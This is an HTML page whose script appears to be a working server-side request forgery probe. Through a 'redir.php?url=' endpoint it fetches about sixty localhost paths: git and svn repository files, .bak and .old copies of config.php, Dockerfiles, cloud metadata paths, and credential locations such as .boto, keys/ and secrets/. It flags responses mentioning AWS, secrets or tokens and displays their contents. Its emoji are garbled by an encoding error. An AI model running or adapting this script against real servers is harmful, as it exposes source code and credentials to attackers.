<!DOCTYPE html>
<html>
<head>
    <title>Version & Git History Discovery</title>
</head>
<body>
    <h1>üìö Version History & Git Repository Discovery</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Look for version control and history information
        var versionTests = [
            // Git repository discovery
            'http://localhost/.git/',
            'http://localhost/.git/config',
            'http://localhost/.git/HEAD',
            'http://localhost/.git/logs/HEAD',
            'http://localhost/.git/refs/heads/master',
            'http://localhost/.git/refs/heads/main',
            'http://localhost/.git/objects/',
            'http://localhost/.git/index',
            'http://localhost/.gitignore',
            
            // SVN
            'http://localhost/.svn/',
            'http://localhost/.svn/entries',
            
            // Other version control
            'http://localhost/.hg/',
            'http://localhost/.bzr/',
            
            // Version/changelog files
            'http://localhost/CHANGELOG',
            'http://localhost/CHANGELOG.md',
            'http://localhost/VERSION',
            'http://localhost/version.txt',
            'http://localhost/release-notes.txt',
            'http://localhost/HISTORY',
            'http://localhost/HISTORY.md',
            
            // Backup and old versions
            'http://localhost/index.php.bak',
            'http://localhost/index.php.old',
            'http://localhost/redir.php.bak',
            'http://localhost/redir.php.old',
            'http://localhost/config.php.bak',
            'http://localhost/config.php.old',
            'http://localhost/backup/',
            'http://localhost/old/',
            'http://localhost/archive/',
            'http://localhost/v1/',
            'http://localhost/v2/',
            'http://localhost/legacy/',
            
            // Development/debug info
            'http://localhost/composer.lock',
            'http://localhost/package-lock.json',
            'http://localhost/yarn.lock',
            'http://localhost/Gemfile.lock',
            'http://localhost/requirements.txt',
            'http://localhost/Pipfile',
            
            // Application specific
            'http://localhost/app.yaml',
            'http://localhost/docker-compose.yml',
            'http://localhost/Dockerfile',
            'http://localhost/manifest.json',
            'http://localhost/metadata.xml',
            
            // Check for old metadata service endpoints that might still work
            'http://localhost/meta-data/',
            'http://localhost/metadata/',
            'http://localhost/instance/',
            'http://localhost/instance-data/',
            'http://localhost/cloud-init/',
            'http://localhost/user-data/',
            
            // Legacy AWS credentials locations
            'http://localhost/aws/',
            'http://localhost/.boto',
            'http://localhost/credentials/',
            'http://localhost/keys/',
            'http://localhost/secrets/'
        ];
        
        for(var i = 0; i < versionTests.length; i++) {
            try {
                results += "<h4>üìÅ " + versionTests[i] + "</h4>";
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'http://localhost/redir.php?url=' + versionTests[i], false);
                xhr.send();
                
                if(xhr.responseText && xhr.responseText.trim().length > 3) {
                    results += "<div style='background:#e8f5e8;padding:8px;border:1px solid green;'>üìã FOUND: " + xhr.responseText.length + " bytes</div>";
                    
                    // Look for sensitive information
                    var text = xhr.responseText.toLowerCase();
                    if(text.includes('aws') || text.includes('secret') || text.includes('key') || text.includes('token') || text.includes('credential')) {
                        results += "<div style='background:#ff6b6b;color:white;padding:5px;border:2px solid red;'>üî• SENSITIVE CONTENT DETECTED! üî•</div>";
                    }
                    if(text.includes('version') || text.includes('changelog') || text.includes('history')) {
                        results += "<div style='background:#74c0fc;padding:5px;'>üìñ VERSION INFO FOUND</div>";
                    }
                    
                    results += "<div style='background:#f0f0f0;padding:8px;font-size:10px;max-height:150px;overflow:scroll;white-space:pre-wrap;'>" + xhr.responseText.substring(0, 1000) + "</div>";
                } else {
                    results += "<div style='background:#ffe8e8;padding:2px;'>‚ùå Empty</div>";
                }
            } catch(e) {
                results += "<div style='background:#ffe8e8;padding:2px;'>‚ùå Failed</div>";
            }
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
